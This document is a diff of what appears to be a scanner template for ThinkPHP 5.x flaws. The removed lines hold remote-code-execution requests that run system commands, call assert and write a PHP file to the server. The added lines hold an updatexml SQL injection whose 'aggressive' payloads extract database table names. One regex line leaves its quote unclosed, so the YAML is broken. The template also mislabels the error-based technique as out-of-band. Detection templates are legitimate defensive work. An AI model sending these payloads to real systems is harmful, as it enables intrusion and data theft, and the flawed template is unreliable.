@@ -1,70 +1,46 @@
 id: thinkphp-sqli
 info:
-  name: ThinkPHP 5.x SQL Injection & RCE
-  severity: Critical
-  description: ThinkPHP 5.x 框架存在SQL注入和远程代码执行漏洞，攻击者可执行任意SQL语句或系统命令
+  name: ThinkPHP SQL Injection (updatexml)
+  severity: High
+  description: |
+    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行带外数据提取。
+    该漏洞通常存在于数组参数的 SQL 查询中。
+  tags:
+    - sqli
+    - thinkphp
+    - updatexml
+    - oob
   reference:
-    - https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection
-    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
-
+    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/
 requests:
   - method: GET
     preconditions:
       methods: [GET]
+      # 可以添加技术栈检测，例如：
+      # requires_tech: [php, mysql]
     path:
-      - "{{BaseURL}}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-      - "{{BaseURL}}/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-      - "{{BaseURL}}/index.php?s=index/think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
-      - "{{BaseURL}}/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
+      # 目标 Vulhub 环境的精确漏洞路径
+      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,{{payload}}),0)]=1"
+    payload_sets:
+      default:
+        # 注入 user() 函数，尝试提取数据库用户名
+        - "user()"
+        # 注入 version() 函数，尝试提取数据库版本
+        - "version()"
+      aggressive:
+        - "user()"
+        - "version()"
+        - "database()"
+        - "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
     matchers:
-      - type: word
-        words:
-          - "PHP Version"
-          - "phpinfo()"
-          - "Configuration"
-        condition: or
+      - type: regex
+        regex:
+          # 匹配 updatexml 报错信息中包含的注入内容
+          - "XPATH syntax error: \\'
+          - "\\n(root@localhost|@localhost)"
+          - "\\n(5.5.62|5.7.22)"
         part: body
-
-  - method: GET
-    preconditions:
-      methods: [GET]
-    path:
-      - "{{BaseURL}}/index.php?s=/index/\\think\\Request/input&filter[]=system&data=echo%20VULN_TEST_12345"
-      - "{{BaseURL}}/index.php?s=/index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20VULN_TEST_12345"
-    matchers:
-      - type: word
-        words:
-          - "VULN_TEST_12345"
-        part: body
-
-  - method: GET
-    preconditions:
-      methods: [GET]
-    path:
-      - "{{BaseURL}}/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
-      - "{{BaseURL}}/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
-    matchers:
-      - type: word
-        words:
-          - "PHP Version"
-          - "phpinfo()"
-        condition: or
-        part: body
+        condition: and
       - type: status
-        status: [200]
-
-  - method: GET
-    preconditions:
-      methods: [GET]
-    path:
-      - "{{BaseURL}}/index.php?s=index/think\\template\\driver\\file/write&cacheFile=test.php&content=%3C%3Fphp%20echo%20VULN_TEST_SUCCESS%3B%3F%3E"
-    matchers:
-      - type: word
-        words:
-          - "success"
-          - "ok"
-          - "true"
-        condition: or
-        part: body
-      - type: status
-        status: [200, 201]
+        status: [500]
+        condition: and
